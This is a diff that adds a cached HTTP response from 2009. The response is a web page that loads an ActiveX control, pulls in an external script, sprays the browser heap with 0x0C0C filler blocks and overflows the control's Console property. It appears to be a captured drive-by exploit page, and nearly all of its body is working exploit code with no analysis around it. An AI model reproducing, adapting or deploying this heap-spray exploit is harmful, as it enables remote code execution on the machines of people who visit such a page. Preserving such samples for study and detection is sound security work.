@@ -1,0 +1,37 @@
+HTTP/1.1 200 OK
+Content-Length: 867
+ETag: "055c768e97c91:60b"
+Date: Wed, 25 Feb 2009 09:08:26 GMT
+Last-Modified: Wed, 25 Feb 2009 06:00:50 GMT
+Content-Type: text/html
+Accept-Ranges: bytes
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+X-Polipo-Location: http://www.sll2468.cn/a1/real.hTml
+X-Polipo-Date: Wed, 25 Feb 2009 09:19:13 GMT
+X-Polipo-Access: Wed, 25 Feb 2009 09:23:50 GMT
+
+<html><body>
+<object id="Cike" classid="clsid:2F542A2E-EDC9-4BF7-8CB1-87C9919F7F93"></object>
+<script src=realdadong.js></script>
+<script language="JavaScript">
+var daxmybr="f";
+var headersize = 20;
+var bigblock = unescape("%u"+"0"+"C"+"0C%u0C"+"0C");
+var slackspace = headersize + mybr.length;
+while (bigblock.length < slackspace) bigblock += bigblock;
+var fillblock = bigblock.substring(0,slackspace);
+var block = bigblock.substring(0,bigblock.length - slackspace);
+while (block.length + slackspace < 0x40000) block = block + block + fillblock;
+var memory = new Array();
+for (i = 0; i < 400; i++){ memory[i] = block + mybr }
+var buf = '';
+while (buf.length < 32) buf = buf + unescape("%0"+"C");
+var m = '';
+m = Cike.Console;
+Cike.Console = buf;
+Cike.Console = m;
+m = Cike.Console;
+Cike.Console = buf;
+Cike.Console = m;
+</script></body></html>
